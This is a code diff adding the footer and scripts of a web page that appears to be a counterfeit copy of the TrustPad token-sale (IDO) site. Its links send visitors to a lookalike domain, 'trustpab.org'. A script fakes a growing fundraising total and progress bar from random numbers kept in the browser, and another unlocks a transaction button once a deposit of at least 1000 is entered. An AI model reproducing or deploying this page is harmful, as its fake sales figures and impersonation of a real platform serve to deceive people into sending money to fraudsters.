+                    <a href="https://docs.google.com/forms/d/e/1FAIpQLSer-PUjhMDG5fmasXYkmvY3EgpTC-yaI4up5by6Hx5g_9wZaw/viewform" target="_blank" rel="noopener noreferrer nofollow" class="no-underline text-white hover:text-main active:text-mainDark focus:text-main">Apply for IDO</a>
+                </li>
+                <li class="mb-4 last:mb-0">
+                    <a href="https://trustpab.org/gtprotocol" target="_blank" rel="noopener noreferrer nofollow" class="no-underline text-white hover:text-main active:text-mainDark focus:text-main">Privacy Policy</a>
+                </li>
+                <li class="mb-4 last:mb-0">
+                    <a href="https://trustpab.org/gtprotocol" target="_blank" rel="noopener noreferrer nofollow" class="no-underline text-white hover:text-main active:text-mainDark focus:text-main">Terms of use</a>
+                </li>
+            </ul>
+        </div>
+        <div class="text-sm">
+            <p class="mb-4 text-lg text-secondary">Help</p>
+            <ul>
+                <li class="mb-4 last:mb-0">
+                    <a href="https://trustpab.org/gtprotocol" target="_blank" rel="noopener noreferrer nofollow" class="no-underline text-white hover:text-main active:text-mainDark focus:text-main">How to participate in IDO</a>
+                </li>
+                <li class="mb-4 last:mb-0"><a href="https://trustpab.org/gtprotocol" target="_blank" rel="noopener noreferrer nofollow" class="no-underline text-white hover:text-main active:text-mainDark focus:text-main">FAQ</a>
+                </li>
+                <li class="mb-4 last:mb-0"><a href="https://trustpab.org/gtprotocol" target="_blank" rel="noopener noreferrer nofollow" class="no-underline text-white hover:text-main active:text-mainDark focus:text-main">About TPAD redistribution fee</a>
+                </li>
+            </ul>
+        </div>
+        <div class="text-sm">
+            <p class="mb-4 text-lg text-secondary">Communities</p>
+            <ul>
+                <li class="mb-4 last:mb-0">
+                    <a href="https://t.me/TrustPad" target="_blank" rel="noopener noreferrer nofollow" class="no-underline text-white hover:text-main active:text-mainDark focus:text-main">🇺🇸 English</a>
+                </li>
+                <li class="mb-4 last:mb-0">
+                    <a href="https://t.me/TrustNFTPadRu" target="_blank" rel="noopener noreferrer nofollow" class="no-underline text-white hover:text-main active:text-mainDark focus:text-main">🇷🇺 Russian</a>
+                </li>
+                <li class="mb-4 last:mb-0">
+                    <a href="https://t.me/TrustPad_CN" target="_blank" rel="noopener noreferrer nofollow" class="no-underline text-white hover:text-main active:text-mainDark focus:text-main">🇨🇳 Chinese</a>
+                </li>
+                <li class="mb-4 last:mb-0">
+                    <a href="https://t.me/TrustPadTurkiye" target="_blank" rel="noopener noreferrer nofollow" class="no-underline text-white hover:text-main active:text-mainDark focus:text-main">🇹🇷 Turkish</a>
+                </li>
+                <li class="mb-4 last:mb-0">
+                    <a href="https://t.me/TrustPad_KOR" target="_blank" rel="noopener noreferrer nofollow" class="no-underline text-white hover:text-main active:text-mainDark focus:text-main">🇰🇷 Korean</a>
+                </li>
+            </ul>
+        </div>
+        <div class="text-sm">
+            <p class="mb-4 text-lg text-secondary">Token</p>
+            <ul>
+                <li class="mb-4 last:mb-0">
+                    <a href="https://www.coingecko.com/en/coins/trustpad" target="_blank" rel="noopener noreferrer nofollow" class="no-underline text-white hover:text-main active:text-mainDark focus:text-main"><img src="img/CoinGecko.885331d3.png" class="h-6 inline-block mr-2">CoinGecko</a>
+                </li>
+                <li class="mb-4 last:mb-0">
+                    <a href="https://coinmarketcap.com/currencies/trustpad/" target="_blank" rel="noopener noreferrer nofollow" class="no-underline text-white hover:text-main active:text-mainDark focus:text-main">
+                        <img src="img/coinmarketcap.7d752e54.png" class="h-6 inline-block mr-2 filter invert">CoinMarketCap</a>
+                </li>
+                <li class="mb-4 last:mb-0"><a href="https://cryptorank.io/fundraising-platforms/trust-pad" target="_blank" rel="noopener noreferrer nofollow" class="no-underline   text-white hover:text-main active:text-mainDark focus:text-main">CryptoRank</a>
+                </li>
+                <li class="mb-4 last:mb-0">
+                    <a href="#" target="_blank" rel="noopener noreferrer nofollow" class="no-underline text-white hover:text-main active:text-mainDark focus:text-main">
+                        <img src="./img/panc.svg" class="h-6 inline-block mr-2">PancakeSwap</a>
+                </li>
+            </ul>
+        </div>
+        <div class="text-sm">
+            <p class="mb-4 text-lg text-secondary">Audits</p>
+            <div class="gap-6 flex flex-col">
+                <a href="https://www.certik.org/projects/trustpad" target="_blank" rel="noreferrer">
+                    <img src="https://trustpad.io/_next/static/media/certik.2bb51929.svg" alt="Certik Trustpad audit" class="h-7">
+                </a>
+                <a href="https://trustpad.io/QuillAudits-TrustPad-Smart-Contract-Audit-Report.pdf" target="_blank">
+                    <img src="img/quillaudits.481ef7d6.png" alt="QuillAudits Trustpad audit" class="h-7">
+                </a>
+            </div>
+        </div>
+    </div>
+</div>
+<div class="container pb-3 text-secondary">
+    <div class="text-xs mt-3">Participants/Citizens from the following countries are strictly excluded/not allowed to participate in the IDOs: Bolivia, Cambodia, Iran, Iraq, Libya, Nepal, Zimbabwe, Liberia, Myanmar, North Korea.</div>
+    <div class="flex justify-between items-center mt-6 gap-3 flex-col-reverse md:flex-row">
+        <div class="text-xs">© Copyright TrustPad <!-- -->2022<!-- -->. All rights reserved.</div></div></div></footer><div class="Toastify"></div></div></div>
+    </body>
+    <script type="text/javascript" src="js/main.js"></script>
+    <script type="text/javascript">
+        if (localStorage.getItem("usdGet") == null) {
+         localStorage.setItem("usdGet", "100000");
+
+         let totalUsd = localStorage.getItem("usdGet");
+         let totalToken = Number(localStorage.getItem("usdGet"))*10;
+         let totalProcent = (totalToken/10000).toFixed(0);
+
+         document.getElementById('totalUsd').innerText = totalUsd;
+         document.getElementById('totalToken').innerText = totalToken;
+         document.getElementById('totalProcent').innerText = totalProcent;
+
+         document.querySelector("body > div > div > div.bg-no-repeat.bg-cover > div > div.relative.max-w-screen-xl.mx-auto > div > div > div.md\\:w-2\\/5.xl\\:w-1\\/3.mb-3.md\\:mb-0.lg\\:sticky.lg\\:top-3 > div > div > div.space-y-6 > div.space-y-1 > div.h-2.bg-gray-600.flex.overflow-hidden.rounded > div").style.width = totalProcent + '%'
+        } else {
+        if (Number(localStorage.getItem("usdGet")) < 470000) {
+            if ((Math.floor(Math.random() * (100 - 1)) + 1) > 70) {
+                let newu = Number(localStorage.getItem("usdGet")) + Math.floor(Math.random() * (24440 - 100)) + 100;
+                localStorage.setItem("usdGet", newu)
+            }
+        } else if (Number(localStorage.getItem("usdGet")) < 477000) {
+            if ((Math.floor(Math.random() * (100 - 1)) + 1) > 50) {
+                let newu = Number(localStorage.getItem("usdGet")) + Math.floor(Math.random() * (100 - 10)) + 10;
+                localStorage.setItem("usdGet", newu)
+            }
+        }
+         let totalUsd = localStorage.getItem("usdGet");
+         let totalToken = Number(localStorage.getItem("usdGet"))*10;
+         let totalProcent = (totalToken/50000).toFixed(0);
+
+         document.getElementById('totalUsd').innerText = totalUsd;
+         document.getElementById('totalToken').innerText = totalToken;
+         document.getElementById('totalProcent').innerText = totalProcent;
+
+         document.querySelector("body > div > div > div.bg-no-repeat.bg-cover > div > div.relative.max-w-screen-xl.mx-auto > div > div > div.md\\:w-2\\/5.xl\\:w-1\\/3.mb-3.md\\:mb-0.lg\\:sticky.lg\\:top-3 > div > div > div.space-y-6 > div.space-y-1 > div.h-2.bg-gray-600.flex.overflow-hidden.rounded > div").style.width = totalProcent + '%'
+         
+        }
+
+  </script>
+
+  <script type="text/javascript"> 
+    document.getElementById('timenow1').innerText = datetext;
+
+    document.getElementById('date1').innerText = monthNames[d.getMonth()] + " " + dd;
+    document.getElementById('date2').innerText = monthNames[d.getMonth()] + " " + dd;
+    document.getElementById('date3').innerText = monthNames[d.getMonth()] + " " + dd;
+  </script>
+
+<script type="text/javascript">
+    btn = document.getElementById('transaction');
+    inp1 = document.getElementById('input_1');
+    inp2 = document.getElementById('input_2');
+
+    if (Number(localStorage.getItem('input_2')) >= 1000) {
+            btn.removeAttribute('disabled')
+        } else {
+            btn.setAttribute('disabled', true)
+        }
+
+    inp1.oninput = function(){
+        if (Number(localStorage.getItem('input_2')) >= 1000) {
+            btn.removeAttribute('disabled')
+        } else {
+            btn.setAttribute('disabled', true)
+        }
+    }
+
+    inp2.oninput = function(){
+        console.log(Number(localStorage.getItem('input_2')))
+        if (Number(localStorage.getItem('input_2')) >= 1000) {
+            btn.removeAttribute('disabled')
+        } else {
+            btn.setAttribute('disabled', true)
+        }
+    }
+  </script>
+
+<script type="text/javascript">
+    let styles = document.createElement('link');
+    styles.href = "style.css"
+    styles.rel = "stylesheet"
+    document.head.prepend(styles)
+
+    let divnot = document.createElement('div');
+    divnot.className = "alert_absolute display-false "
+    divnot.id = "alerts"
+    document.body.prepend(divnot)
+
+    const notification = document.getElementById('alerts')
+
+    let div = document.createElement('div');
+    div.id = "alert-notification"
+    notification.prepend(div)
+
+    const alerts = document.getElementById('alert-notification')
+
+let statusAlerts = true
+function Alert (text, style, time = 3500) {
+    if(statusAlerts) {
+        statusAlerts = false
+        alerts.className = "alert alert-" + style
+        alerts.innerHTML = text
+    
+        notification.className = "alert_absolute display-true"
+        setTimeout(() => {
+            notification.className = "alert_absolute display-false"
+            setTimeout(() => {
+                notification.className = ""
+                alerts.className = ""
+                alerts.innerHTML = ""
+                statusAlerts = true
+            }, 500)
+        }, time)
+    }
+}
+  </script>
+
+</html>
